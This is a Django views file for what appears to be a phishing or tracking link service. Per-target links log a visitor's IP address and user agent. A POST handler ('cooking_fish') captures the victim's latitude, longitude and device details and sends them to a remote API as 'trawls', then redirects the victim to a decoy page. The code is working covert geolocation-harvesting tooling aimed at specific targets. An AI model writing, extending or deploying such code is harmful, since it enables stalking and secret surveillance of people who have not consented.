import requests,json
from django.shortcuts import render,redirect
from django.http import HttpResponse, JsonResponse
from user_agents import parse
from rest_framework.parsers import JSONParser
from config.links import *

links = get_api()

def index(request, code):
    user_agent_string = request.META.get('HTTP_USER_AGENT')
    ip_address = request.META.get('REMOTE_ADDR')
    user_agent = parse(user_agent_string)
    device_info = f"{ip_address} / {user_agent}"
    data = get_target_data(code)
    if data.get('success') == False:
        return redirect('404')
    else:
        if request.method == 'GET':
            content = {
                'myboy': data['target_code'],
                'device_info': device_info
            }
            return render(request, 'trawl_page.html',content)


def cooking_fish(request):
    if request.method == 'POST':
            data = JSONParser().parse(request)
            target_data = {
                'target_code': data['myboy'],
                "latitute": data['latitude'],
                "longitude": data['longitude'],
                "device_info": data['device_info'],
                "message": data['msg'],

            }
            saving = save_trawls(target_data)
            return JsonResponse({"link":saving['link']})

            #    return redirect(saving['link'])
            # return JsonResponse({"success": saving['success'],"link":saving['link']})
    return render(request, '404.html')

def get_target_data(target_id):
    url = f"{links['traffic']}://{links['host']}/api/{target_id}/"
    cert = ('/var/www/S-Cert/cert1.pem')
    try:
        response = requests.get(url,cert=cert)
        data = response.json()
        return data
    except (requests.RequestException, json.JSONDecodeError) as e:
        # Handle the request or JSON decoding error
        print(f"Error occurred: {e}")
        return {'success': False}

def save_trawls(target_data):
    url = f"{links['traffic']}://{links['host']}/api/trawls_save/"
    cert = ('/var/www/S-Cert/cert1.pem')
    # Send POST request to save the trawls
    response = requests.post(url, json=target_data,cert=cert)

    # Check the response
    if response.status_code == 201:  # HTTP status code for "Created"
        response_data = response.json()
        # print("Trawls saved successfully!")
        if response_data["Redirect URL"] is None:
            redirect_url = f"{links['default_redirect_uri']}"
            data = {'link':redirect_url,"success":True}
            return data
        else:
            redirect_url = response_data["Redirect URL"]
            data = {'link':redirect_url,"success":True}
            return data
    else:
        data = {'link':f"{links['default_redirect_uri']}","success":False}
        return data

def page_404(request):
    return render(request, '404.html')

